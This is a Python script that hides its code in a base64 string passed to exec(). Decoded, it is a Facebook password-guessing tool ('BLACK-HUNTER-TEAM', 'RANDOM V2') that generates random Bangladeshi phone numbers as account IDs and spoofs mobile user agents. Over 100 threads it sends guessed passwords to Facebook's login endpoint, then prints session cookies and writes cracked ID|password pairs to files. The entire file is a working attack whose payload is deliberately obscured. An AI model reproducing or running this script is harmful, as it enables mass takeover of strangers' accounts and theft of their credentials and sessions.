import base64
exec(base64.b64decode("aW1wb3J0IG9zLHN5cyx0aW1lLGpzb24scmFuZG9tLHJlLHN0cmluZyxwbGF0Zm9ybSxiYXNlNjQsdXVpZA0KZnJvbSBiczQgaW1wb3J0IEJlYXV0aWZ1bFNvdXAgYXMgc29wDQpmcm9tIGJzNCBpbXBvcnQgQmVhdXRpZnVsU291cA0KaW1wb3J0IHJlcXVlc3RzIGFzIHJlc3MNCmZyb20gZGF0ZXRpbWUgaW1wb3J0IGRhdGUNCmZyb20gZGF0ZXRpbWUgaW1wb3J0IGRhdGV0aW1lDQpmcm9tIHRpbWUgaW1wb3J0IHNsZWVwDQpmcm9tIG9zIGltcG9ydCBzeXN0ZW0gYXMgcw0KZnJvbSB0aW1lIGltcG9ydCBzbGVlcCBhcyB3YWt0dQ0KdHJ5Og0KICAgIGltcG9ydCByZXF1ZXN0cw0KICAgIGZyb20gY29uY3VycmVudC5mdXR1cmVzIGltcG9ydCBUaHJlYWRQb29sRXhlY3V0b3IgYXMgVGhyZWFkUG9vbA0KICAgIGltcG9ydCBtZWNoYW5pemUNCiAgICBmcm9tIHJlcXVlc3RzLmV4Y2VwdGlvbnMgaW1wb3J0IENvbm5lY3Rpb25FcnJvcg0KZXhjZXB0IE1vZHVsZU5vdEZvdW5kRXJyb3I6DQogICAgb3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBtZWNoYW5pemUgcmVxdWVzdHMgZnV0dXJlcyBiczQ9PTIgPiAvZGV2L251bGwnKQ0KICAgIG9zLnN5c3RlbSgncGlwIGluc3RhbGwgYnM0JykNCmxvb3AgPSAwDQpva3MgPSBbXQ0KY3BzID0gW10NCnVnZW4yPVtdDQp1Z2VuPVtdDQpjb2ticnV0PVtdDQpzZXM9cmVxdWVzdHMuU2Vzc2lvbigpDQp1Z2VuPVtdDQp1YXM9W10NCmZvciB1YSBpbiByYW5nZSg1MDAwKToNCiAgICAgIGE9J01vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCcNCiAgICAgIGI9cmFuZG9tLmNob2ljZShbJzUuMS4xJyAsICc2LjAuMScgLCAnNy4xLjEnICwgJzEyJyAsICcxMycgLCAnMTQnICwgJzE1J10pDQogICAgICB5PXJhbmRvbS5jaG9pY2UoWydTTS1KMzIwSCcgLCAnU00tSjMxMDknICwgJ0ozMjBGTicgLCAnU00tSjMyMFAnICwgJ1NNLUozMjBGJyAsICdTTS1KMzIwRycgLCAnU00tSjMyMFknXSkNCiAgICAgIGM9J0J1aWxkL0xNWTQ3WDsgd3YpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vNC4wIENocm9tZS8nDQogICAgICBkPXJhbmRvbS5yYW5kcmFuZ2UoNDAsMTE1KQ0KICAgICAgZT0nMCcNCiAgICAgIGY9cmFuZG9tLnJhbmRyYW5nZSgzMDAwLDYwMDApDQogICAgICBnPXJhbmRvbS5yYW5kcmFuZ2UoMjAsMTAwKQ0KICAgICAgaD0nTW9iaWxlIFNhZmFyaS81MzcuMzYnDQogICAgICB1Zz0oZiJ7YX0ge2J9OyB7eX0ge2N9e2R9LntlfS57Zn0ue2d9IHtofSIpDQogICAgICB1Z2VuLmFwcGVuZCh1ZykNCmZvciB1YSBpbiByYW5nZSg1MDAwKToNCiAgICBhPSdOb2tpYVgnDQogICAgYj1yYW5kb20ucmFuZHJhbmdlKDEsOSkNCiAgICBjPSctMCcNCiAgICBkPXJhbmRvbS5yYW5kcmFuZ2UoMSw5KQ0KICAgIGU9Jy8nDQogICAgZj1yYW5kb20ucmFuZHJhbmdlKDEsOSkNCiAgICBnPScuMCAoJw0KICAgIGg9cmFuZG9tLnJhbmRyYW5nZSgxLDEyKQ0KICAgIGk9J1Byb2ZpbGUvTUlEUC0yLjEgQ29uZmlndXJhdGlvbi9DTERDLTEuMScNCiAgICBqPSdVTlRSVVNURUQvJw0KICAgIGs9cmFuZG9tLnJhbmRyYW5nZSgxLDMpDQogICAgbD0nLjAnDQogICAgdWFrdTI9Zid7YX17Yn17Y317ZH17ZX17Zn17Z317aH17aX17an17a317bH0nDQogICAgdWdlbi5hcHBlbmQodWFrdTIpDQpsb2dvPSgiIiINClwwMzNbOTM7MW0gIF9fX18gICAgICAgIF8gICAgXyAgIF9fX19fX18gX19fX19fICAgICAgICAgIF9fICBfXyANClwwMzNbMTszMm0gfCAgXyBcICAgICAgfCB8ICB8IHwgfF9fICAgX198ICBfX19ffCAgIC9cICAgfCAgXC8gIHwNClwwMzNbOTE7MW0gfCB8XykgfF9fX19ffCB8X198IHwgICAgfCB8ICB8IHxfXyAgICAgLyAgXCAgfCBcICAvIHwNClwwMzNbOTU7MW0gfCAgXyA8X19fX19ffCAgX18gIHwgICAgfCB8ICB8ICBfX3wgICAvIC9cIFwgfCB8XC98IHwNClwwMzNbOTQ7MW0gfCB8XykgfCAgICAgfCB8ICB8IHwgICAgfCB8ICB8IHxfX19fIC8gX19fXyBcfCB8ICB8IHwNClwwMzNbOTM7MW0gfF9fX18vICAgICAgfF98ICB8X3wgICAgfF98ICB8X19fX19fL18vICAgIFxfXF98ICB8X3wgDQoNClwzM1sxOzMybT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0NClwwMzNbMTs5NW1bXDAzM1sxOzkzbVs+XVwwMzNbMTs5NW1dXDAzM1sxOzkzbSBBVVRIT1IgIFwwMzNbMTs5MW0gOiBcMDMzWzE7OTVtRkFSQUJJIENIT1dESFVSWQ0KXDAzM1sxOzk1bVtcMDMzWzE7OTNtWz5dXDAzM1sxOzk1bV1cMDMzWzE7OTNtIEZBQ0VCT09LXDAzM1sxOzkxbSA6IFwwMzNbMTs5NW1GQVJBQkkgQ0hPV0RIVVJZDQpcMDMzWzE7OTVtW1wwMzNbMTs5M21bPl1cMDMzWzE7OTVtXVwwMzNbMTs5M20gR0lUSFVCICBcMDMzWzE7OTFtIDogXDAzM1sxOzk1bUJMQUNLLUhVTlRFUi1URUFNDQpcMDMzWzE7OTVtW1wwMzNbMTs5M21bPl1cMDMzWzE7OTVtXVwwMzNbMTs5M20gVE9PTFMgICBcMDMzWzE7OTFtIDogXDAzM1sxOzk1bVJBTkRPTSBWMg0KXDAzM1sxOzk1bVtcMDMzWzE7OTNtWz5dXDAzM1sxOzk1bV1cMDMzWzE7OTNtIFZFUlNJT04gXDAzM1sxOzkxbSA6IFwwMzNbMTs5MW0xLjkuOA0KXDMzWzE7MzJtPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PQ0KIiIiKQ0KdHJ5Og0KICAgIGtleTE9b3BlbigiL3N0b3JhZ2UvZW11bGF0ZWQvMC9hbmRyb2lkOC50eHQiLCdyJykucmVhZCgpDQpleGNlcHQgSU9FcnJvcjoNCiAgICBrb2s9b3BlbigiL3N0b3JhZ2UvZW11bGF0ZWQvMC9hbmRyb2lkOC50eHQiLCd3JykNCiAgICBteWlkPXV1aWQudXVpZDQoKS5oZXhbOjEyXQ0KICAgIGY9IkNPQlJBLUxJTlVYIg0KICAgIGtleT1teWlkK2YNCiAgICBrb2sud3JpdGUoa2V5KQ0KICAgIGtvay5jbG9zZSgpDQogICAgcHJpbnQoa2V5KQ0KDQphPXJlcXVlc3RzLmdldCgiaHR0cHM6Ly9naXRodWIuY29tL2phaGllZC9FQy0xNzAvYmxvYi9tYWluL1JhbmRvbS12Mi50eHQiKS50ZXh0DQpiPXN0cihhKQ0Ka2V5MT1vcGVuKCIvc3RvcmFnZS9lbXVsYXRlZC8wL2FuZHJvaWQ4LnR4dCIsJ3InKS5yZWFkKCkNCmtleTI9c3RyKGtleTEpICANCmlmIGtleTIgaW4gYjoNCiAgICBwYXNzDQogICAgDQplbHNlOg0KICAgIG9zLnN5c3RlbSgiY2xlYXIiKQ0KICAgIHByaW50DQogICAgcHJpbnQoIllvdXIga2V5ICA6ICIra2V5MikNCiAgICBwcmludCgiXG5cdFx0Q29udGFjdCBBZG1pbiAiKQ0KICAgIG9zLnN5c3RlbSgneGRnLW9wZW4gaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tLzEwMDA5MTMxMzA0NzQ5NScpDQogICAgZXhpdCgpDQpBID0gJ1x4MWJbMTs5N20nIA0KQiA9ICdceDFiWzE7OTZtJyANCkMgPSAnXHgxYlsxOzkxbScgDQpEID0gJ1wwMzNbMzg7NTs0Nm0nDQpNID0gJ1wwMzNbMTszMW0nDQpIID0gJ1wwMzNbMzg7NTs0Nm0nDQpOID0gJ1x4MWJbMTszN20nICAgIA0KRSA9ICdceDFiWzE7OTNtJyANCkYgPSAnXHgxYlsxOzk0bScNCkcgPSAnXHgxYlsxOzk1bScNClAgPSAnXDAzM1sxOzM3bScNCmRlZiBmdWNrKCk6DQogICAgdXNlcj1bXQ0KICAgIG9zLnN5c3RlbSgnY2xlYXInKQ0KICAgIG9zLnN5c3RlbSgneGRnLW9wZW4gaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tLzEwMDA5MTMxMzA0NzQ5NScpDQogICAgcHJpbnQobG9nbykNCiAgICBwcmludCgnWytdIFNJTSBDT0RFIEJEPT4gMDE24oCiMDE34oCiMDE44oCiMDE5JykNCiAgICBudWRlID0gaW5wdXQoJ1wwMzNbMTszMm1bXDAzM1sxOzMybT9cMDMzWzE7MzJtXSBTSU0gQ09ERSA6ICcpDQogICAgbnVkZXggPSAnJy5qb2luKHJhbmRvbS5jaG9pY2Uoc3RyaW5nLmRpZ2l0cykgZm9yIF8gaW4gcmFuZ2UoMikpDQogICAgbnVkID0gJycuam9pbihyYW5kb20uY2hvaWNlKHN0cmluZy5kaWdpdHMpIGZvciBfIGluIHJhbmdlKDIpKQ0KICAgIHByaW50KCdbK10gMjAwMOKAojUwMDDigKIxMDAwMOKAojE1MDAw4oCiNTAwMDAnKQ0KICAgIGxpbWl0ID0gaW50KGlucHV0KCdbP10gRU5URVIgWU9VUiBDUkFDSyBMSU1JVCA6ICcpKQ0KICAgIGZvciBubWJyIGluIHJhbmdlKGxpbWl0KToNCiAgICAgICAgbm1wID0gJycuam9pbihyYW5kb20uY2hvaWNlKHN0cmluZy5kaWdpdHMpIGZvciBfIGluIHJhbmdlKDQpKQ0KICAgICAgICB1c2VyLmFwcGVuZChubXApDQogICAgd2l0aCBUaHJlYWRQb29sKG1heF93b3JrZXJzPTEwMCkgYXMgTVVFT1I6DQogICAgICAgIG9zLnN5c3RlbSgnY2xlYXInKQ0KICAgICAgICBwcmludChsb2dvKQ0KICAgICAgICB0bCA9IHN0cihsZW4odXNlcikpDQogICAgICAgIHByaW50KCdcMDMzWzE7MzdtW1wwMzNbMTszMm3inJNcMDMzWzE7MzJtXSBTSU0gQ09ERSA6ICcrbnVkZSkNCiAgICAgICAgcHJpbnQoJ1wwMzNbMTszN21bXDAzM1sxOzMybeKck1wwMzNbMTszMm1dIFNPTUUgSUQsUyBXQVMgTE9DS0VEICcpDQogICAgICAgIHByaW50KCdcMDMzWzE7MzdtW1wwMzNbMTszMm3inJNcMDMzWzE7MzJtXSBUT09MIENSRUFURUQgQlkgRkFSQUJJIENIT1dESFVSWSAnKQ0KICAgICAgICBwcmludCgnXDAzM1sxOzM3bVtcMDMzWzE7MzJt4pyTXDAzM1sxOzMybV0gVE9UQUwgSUQgOiAnK3RsKQ0KICAgICAgICBwcmludCgnXDAzM1sxOzMybT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0nKQ0KICAgICAgICBmb3IgZ3VydSBpbiB1c2VyOg0KICAgICAgICAgICAgdWlkID0gbnVkZStudWRleCtudWQrZ3VydQ0KICAgICAgICAgICAgcHd4ID0gW251ZGUrbnVkZXgrbnVkK2d1cnUsbnVkK2d1cnUsbnVkZXgrZ3VydSxudWRlK251ZGV4K251ZCwnYmFuZ2xhJ10NCiAgICAgICAgICAgIE1VRU9SLnN1Ym1pdChyY3JhY2ssdWlkLHB3eCx0bCkNCiAgICBwcmludCgnXDAzM1sxOzMybT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0nKQ0KICAgIHByaW50KCdcMDMzWzE7MzdtW1wwMzNbMTszMm1+XDAzM1sxOzM3bV0gQ1JBQ0sgU1VDQ0VTU0ZVTExZIENPTVBMRVRFRC4uJykNCiAgICBwcmludCgnXDAzM1sxOzMybT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0nKQ0KZGVmIHJjcmFjayh1aWQscHd4LHRsKToNCiAgICBnbG9iYWwgbG9vcA0KICAgIGdsb2JhbCBjcHMNCiAgICBnbG9iYWwgb2tzDQogICAgZ2xvYmFsIHByb3h5DQogICAgdHJ5Og0KICAgICAgICBmb3IgcHMgaW4gcHd4Og0KICAgICAgICAgICAgcHJvID0gcmFuZG9tLmNob2ljZSh1Z2VuKQ0KICAgICAgICAgICAgc2Vzc2lvbiA9IHJlcXVlc3RzLlNlc3Npb24oKQ0KICAgICAgICAgICAgYmkgPSByYW5kb20uY2hvaWNlKFtBLEIsQyxELEUsRixHLEhdKQ0KICAgICAgICAgICAgc3lzLnN0ZG91dC53cml0ZShmJ1xyIFwwMzNbMTszMW1bJXNCSC1URUFNXDAzM1sxOzMxbV1cMDMzWzE7MzRtXDAzM1sxOzMxbVtcMDMzWzM4OzU7MTk1bSVzLyVzXDAzM1sxOzMxbV1cMDMzWzE7MzRtXDAzM1szODs1OzQ1bU9LLVwwMzNbMzg7NTs0Nm0lc1xyJyUoYmksbG9vcCx0bCxsZW4ob2tzKSkpLA0KICAgICAgICAgICAgc3lzLnN0ZG91dC5mbHVzaCgpDQogICAgICAgICAgICBmcmVlX2ZiID0gc2Vzc2lvbi5nZXQoJ2h0dHBzOi8veC5mYWNlYm9vay5jb20nKS50ZXh0DQogICAgICAgICAgICBsb2dfZGF0YSA9IHsNCiAgICAgICAgICAgICAgICAibHNkIjpyZS5zZWFyY2goJ25hbWU9ImxzZCIgdmFsdWU9IiguKj8pIicsIHN0cihmcmVlX2ZiKSkuZ3JvdXAoMSksDQogICAgICAgICAgICAiamF6b2VzdCI6cmUuc2VhcmNoKCduYW1lPSJqYXpvZXN0IiB2YWx1ZT0iKC4qPykiJywgc3RyKGZyZWVfZmIpKS5ncm91cCgxKSwNCiAgICAgICAgICAgICJtX3RzIjpyZS5zZWFyY2goJ25hbWU9Im1fdHMiIHZhbHVlPSIoLio/KSInLCBzdHIoZnJlZV9mYikpLmdyb3VwKDEpLA0KICAgICAgICAgICAgImxpIjpyZS5zZWFyY2goJ25hbWU9ImxpIiB2YWx1ZT0iKC4qPykiJywgc3RyKGZyZWVfZmIpKS5ncm91cCgxKSwNCiAgICAgICAgICAgICJ0cnlfbnVtYmVyIjoiMCIsDQogICAgICAgICAgICAidW5yZWNvZ25pemVkX3RyaWVzIjoiMCIsDQogICAgICAgICAgICAiZW1haWwiOnVpZCwNCiAgICAgICAgICAgICJwYXNzIjpwcywNCiAgICAgICAgICAgICJsb2dpbiI6IkxvZyBJbiJ9DQogICAgICAgICAgICBoZWFkZXJfZnJlZWZiID0gew0KICAgICAgICAgICAgJ2F1dGhvcml0eSc6ICd4LmZhY2Vib29rLmNvbScsDQogICAgICAgICAgICAnYWNjZXB0JzogJ3RleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCxpbWFnZS9hcG5nLCovKjtxPTAuOCxhcHBsaWNhdGlvbi9zaWduZWQtZXhjaGFuZ2U7dj1iMztxPTAuNycsDQogICAgICAgICAgICAnYWNjZXB0LWxhbmd1YWdlJzogJ2VuLVVTLGVuO3E9MC45JywNCiAgICAgICAgICAgICdjYWNoZS1jb250cm9sJzogJ21heC1hZ2U9MCcsDQogICAgICAgICAgICAnc2VjLWNoLXByZWZlcnMtY29sb3Itc2NoZW1lJzogJ2xpZ2h0JywNCiAgICAgICAgICAgICdzZWMtY2gtdWEnOiAnIk5vdDpBLUJyYW5kIjt2PSI5OSIsICJDaHJvbWl1bSI7dj0iMTEyIicsDQogICAgICAgICAgICAnc2VjLWNoLXVhLWZ1bGwtdmVyc2lvbi1saXN0JzogJyJOb3Q6QS1CcmFuZCI7dj0iOTkuMC4wLjAiLCAiQ2hyb21pdW0iO3Y9IjExMi4wLjU2MTUuMTM3IicsDQogICAgICAgICAgICAnc2VjLWNoLXVhLW1vYmlsZSc6ICc/MScsDQogICAgICAgICAgICAnc2VjLWNoLXVhLXBsYXRmb3JtJzogJyJBbmRyb2lkIicsDQogICAgICAgICAgICAnc2VjLWNoLXVhLXBsYXRmb3JtLXZlcnNpb24nOiAnIjEyLjAuMCInLA0KICAgICAgICAgICAgJ3NlYy1mZXRjaC1kZXN0JzogJ2RvY3VtZW50JywNCiAgICAgICAgICAgICdzZWMtZmV0Y2gtbW9kZSc6ICduYXZpZ2F0ZScsDQogICAgICAgICAgICAnc2VjLWZldGNoLXNpdGUnOiAnbm9uZScsDQogICAgICAgICAgICAnc2VjLWZldGNoLXVzZXInOiAnPzEnLA0KICAgICAgICAgICAgJ3VwZ3JhZGUtaW5zZWN1cmUtcmVxdWVzdHMnOiAnMScsDQogICAgICAgICAgICAndXNlci1hZ2VudCc6IHBybyx9DQogICAgICAgICAgICBsbyA9IHNlc3Npb24ucG9zdCgnaHR0cHM6Ly94LmZhY2Vib29rLmNvbS9sb2dpbi9kZXZpY2UtYmFzZWQvbG9naW4vYXN5bmMvP3JlZnNyYz1kZXByZWNhdGVkJmx3dj0xMDAnLGRhdGE9bG9nX2RhdGEsaGVhZGVycz1oZWFkZXJfZnJlZWZiKS50ZXh0DQogICAgICAgICAgICBsb2dfY29va2llcz1zZXNzaW9uLmNvb2tpZXMuZ2V0X2RpY3QoKS5rZXlzKCkNCiAgICAgICAgICAgIGlmICdjX3VzZXInIGluIGxvZ19jb29raWVzOg0KICAgICAgICAgICAgICAgIGNva2k9IjsiLmpvaW4oW2tleSsiPSIrdmFsdWUgZm9yIGtleSx2YWx1ZSBpbiBzZXNzaW9uLmNvb2tpZXMuZ2V0X2RpY3QoKS5pdGVtcygpXSkNCiAgICAgICAgICAgICAgICBjaWQgPSBjb2tpWzY1OjgwXQ0KICAgICAgICAgICAgICAgIHByaW50KGYiXDAzM1szODs1OzQ2bVtCSFQtT0vwn5KaXSB7dWlkfSDigKIge3BzfSIgJyAgXG5cMDMzWzE7MzNtIFvwn5KJXVwwMzNbMTszM21Db29raWUgPSBcMDMzWzE7MzJtJytjb2tpKyAgJyBcblwwMzNbMTszM20gW/CfpKddIFwwMzNbMTszMm1VYSA9IFwwMzNbMTszNG0nK3BybysnICBcMDMzWzA7OTdtJykNCiAgICAgICAgICAgICAgICBvcGVuKCcvc2RjYXJkL0JIVC1PSy50eHQnLCAnYScpLndyaXRlKCB1aWQrJyB8ICcrcHMrJ1xuJykNCiAgICAgICAgICAgICAgICBva3MuYXBwZW5kKHVpZCkNCiAgICAgICAgICAgICAgICBicmVhaw0KICAgICAgICAgICAgZWxpZiAnY2hlY2twb2ludCcgaW4gbG9nX2Nvb2tpZXM6DQogICAgICAgICAgICAgICAgY29raT0iOyIuam9pbihba2V5KyI9Iit2YWx1ZSBmb3Iga2V5LHZhbHVlIGluIHNlc3Npb24uY29va2llcy5nZXRfZGljdCgpLml0ZW1zKCldKQ0KICAgICAgICAgICAgICAgIGNpZCA9IGNva2lbODI6OTddDQogICAgICAgICAgICAgICAgcHJpbnQoZiJceDFiWzM4OzU7MTk2bVtCSFQtQ1Dwn5KUXSB7dWlkfSDigKIge3BzfSIpDQogICAgICAgICAgICAgICAgb3BlbignL3NkY2FyZC9CSFQtQ1AudHh0JywgJ2EnKS53cml0ZSggdWlkKycgfCAnK3BzKycgXG4nKQ0KICAgICAgICAgICAgICAgIGNwcy5hcHBlbmQodWlkKQ0KICAgICAgICAgICAgICAgIGJyZWFrDQogICAgICAgICAgICBlbHNlOg0KICAgICAgICAgICAgICAgIGNvbnRpbnVlDQogICAgICAgIGxvb3ArPTENCiAgICAgICAgDQogICAgZXhjZXB0Og0KICAgICAgICBwYXNzDQoNCmZ1Y2soKQ=="))